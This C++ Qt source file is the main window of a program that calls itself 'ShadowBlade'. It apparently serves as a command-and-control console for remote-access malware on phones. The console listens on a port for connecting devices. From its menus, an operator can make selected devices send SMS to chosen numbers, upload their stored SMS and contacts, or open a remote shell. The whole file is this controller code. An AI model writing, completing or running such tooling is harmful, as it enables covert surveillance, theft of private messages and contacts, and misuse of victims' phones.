#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QJsonDocument>
#include <QJsonArray>
#include <QJsonObject>
#include <QDateTime>
#include <QFile>
#include <QDir>
#include <QTextStream>
#include <QMessageBox>
#include <QInputDialog>
#include <QCloseEvent>
#include <QMouseEvent>
#include "dialog/sendsmsdialog.h"

MainWindow::MainWindow(SessionManager& sessionManager, QWidget *parent) :
    mSessionManager(sessionManager),
    mNetworkManager(sessionManager),
    mModelHostList(mNetworkManager.getHostPool()),
    mPort(8000),
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    init();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::closeEvent(QCloseEvent * event)
{
    if(QMessageBox::information(this,QString(" "),QString("Quit?"),QMessageBox::Yes,QMessageBox::No)!=QMessageBox::Yes)
    {
        event->ignore();
    }
    else
    {
        event->accept();
    }
}

void MainWindow::initRightMenu(QWidget* widget)
{
    QAction *aAll,*aNone,*aReverse;
    widget->addAction(aAll = new QAction(QString("Select All"),ui->tableViewHostList));
    widget->addAction(aNone = new QAction(QString("unSelect All"),ui->tableViewHostList));
    widget->addAction(aReverse = new QAction(QString("Reverse Select"),ui->tableViewHostList));

    QObject::connect(aAll,SIGNAL(triggered()),&mModelHostList,SLOT(selectAll()));
    QObject::connect(aNone,SIGNAL(triggered()),&mModelHostList,SLOT(unselectAll()));
    QObject::connect(aReverse,SIGNAL(triggered()),&mModelHostList,SLOT(reverseSelect()));

    QAction *separator = new QAction(QString(),ui->tableViewHostList);
    separator->setSeparator(true);
    widget->addAction(separator);


    QAction *aSendSms,*aLoadContact,*aLoadSms;
    widget->addAction(aSendSms = new QAction(QString("Send Sms"),ui->tableViewHostList));
    widget->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableViewHostList));
    widget->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableViewHostList));

    QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
}

void MainWindow::initLeftMenu(QWidget* widget)
{
    QAction *aRemoteShell;
    widget->addAction(aRemoteShell = new QAction(QString("Remote shell"),ui->tableViewHostList) );

}

void MainWindow::initNetworkManager()
{
    qRegisterMetaType<HostInfo>("HostInfo");
    QObject::connect(&mNetworkManager, SIGNAL(onHostPoolChange()), &mModelHostList, SLOT(refresh()));
    QObject::connect(&mNetworkManager, SIGNAL(onStartSessionSuccess(QString,HostInfo)), this, SLOT(onStartSessionSuccess(QString,HostInfo)));
    QObject::connect(&mNetworkManager, SIGNAL(onStartSessionFailed(QString,HostInfo)), this, SLOT(onStartSessionFailed(QString,HostInfo)));
}

void MainWindow::initHostList()
{
    ui->tableViewHostList->setModel(&mModelHostList);
    ui->tableViewHostList->setContextMenuPolicy(Qt::ActionsContextMenu);
    ui->tableViewHostList->resizeColumnToContents(0);
    ui->tableViewHostList->horizontalHeader()->resizeSection(1, 200);
    QObject::connect(&mModelHostList,SIGNAL(modelReset()),this,SLOT(updateHostListView()));
}


void MainWindow::init()
{
    initNetworkManager();
    initHostList();

    initLeftMenu(&mLeftMenu);
    initRightMenu(ui->tableViewHostList);

    ui->actionListenPort->setText("Listen Port");
    QObject::connect(ui->actionListenPort, SIGNAL(triggered()), this, SLOT(handleServerStart()));
    updateHostListView();

    outputLogWarning("====================   ShadowBlade Running  ====================");
}

void MainWindow::updateHostListView()
{
    ui->hostCountLabel->setText(QString("Host: %1, Selected: %2").arg(mNetworkManager.getHostPool().size()).arg(mNetworkManager.getHostPool().getSelectedCount()));
}

void MainWindow::handleServerStart()
{
    if(mNetworkManager.isStart())
    {
        mNetworkManager.stop();
        mNetworkManager.getHostPool().cleanAll();
        ui->actionListenPort->setText("Listen Port");
        outputLogNormal("Listen Stop");
    }
    else
    {
        bool ok = false;
        mPort = QInputDialog::getInt(this, "Listen Port", "Input port:", mPort,  1, 65535, 1, &ok);
        if(ok)
        {
            if(mNetworkManager.start(mPort))
            {
                ui->actionListenPort->setText(QString("Stop Listen (Listen on port: %1)").arg(mPort));
                outputLogNormal(QString("Listen Start on port: %1").arg(mPort) );
            }
            else
            {
                outputLogWarning(QString("[FAILED] Listen Start on port: %1").arg(mPort) );
            }
        }
    }
}

void MainWindow::sendSms()
{
    if(mNetworkManager.getHostPool().getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QString("Please select at least one host"));
        return;
    }
    SendSmsDialog sendSmsDialog(this);
    if(sendSmsDialog.exec()==QDialog::Accepted)
    {
        QJsonObject jsonObject;
        QJsonDocument jsonDocument;
        jsonObject.insert(QString("content"), sendSmsDialog.getContent());
        if(sendSmsDialog.isSendNumberList())
        {
            QJsonArray jsonArray;
            vector<QString> numberList = sendSmsDialog.getPhoneNumberList();
            unsigned int i;
            for(i=0; i<numberList.size(); ++i)
            {
                jsonArray.append(numberList.at(i));
            }
            jsonObject.insert(QString("only"), jsonArray);
        }
        jsonDocument.setObject(jsonObject);
        vector<HostInfo> hostInfoList = mNetworkManager.getHostPool().getSelectedHostAddr();
        for(unsigned int i=0; i<hostInfoList.size(); ++i)
        {
            mNetworkManager.startSession(hostInfoList.at(i), ACTION_SEND_SMS, jsonDocument.toJson());
        }
    }
}
void MainWindow::loadSms()
{
    if(mNetworkManager.getHostPool().getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QString("Please select at least one host"));
        return;
    }
    vector<HostInfo> hostInfoList = mNetworkManager.getHostPool().getSelectedHostAddr();
    for(unsigned int i=0; i<hostInfoList.size(); ++i)
    {
        mNetworkManager.startSession(hostInfoList.at(i), ACTION_UPLOAD_SMS);
    }
}
void MainWindow::loadContact()
{
    if(mNetworkManager.getHostPool().getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QString("Please select at least one host"));
        return;
    }
    vector<HostInfo> hostInfoList = mNetworkManager.getHostPool().getSelectedHostAddr();
    for(unsigned int i=0; i<hostInfoList.size(); ++i)
    {
        mNetworkManager.startSession(hostInfoList.at(i), ACTION_UPLOAD_CONTACT);
    }
}

void MainWindow::on_tableViewHostList_doubleClicked(const QModelIndex &index)
{
    if(mNetworkManager.getHostPool().getHostInfo(index.row(), mHostInfo))
    {
        mLeftMenu.popup(cursor().pos());
    }
}

void MainWindow::outputLogNormal(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + text );
}

void MainWindow::outputLogWarning(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#F00>" + text + "</font>");
}

void MainWindow::outputLogSuccess(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#0A0>" + text + "</font>");
}


void MainWindow::onStartSessionSuccess(QString sessionName, HostInfo hostInfo)
{
    outputLogSuccess( QString("[SUCCESS] %1 on %2:%3").arg(sessionName).arg(hostInfo.addr.toString()).arg(hostInfo.port)  );
}
void MainWindow::onStartSessionFailed(QString sessionName, HostInfo hostInfo)
{
    outputLogWarning( QString("[FAILED] %1 on %2:%3").arg(sessionName).arg(hostInfo.addr.toString()).arg(hostInfo.port)  );
}
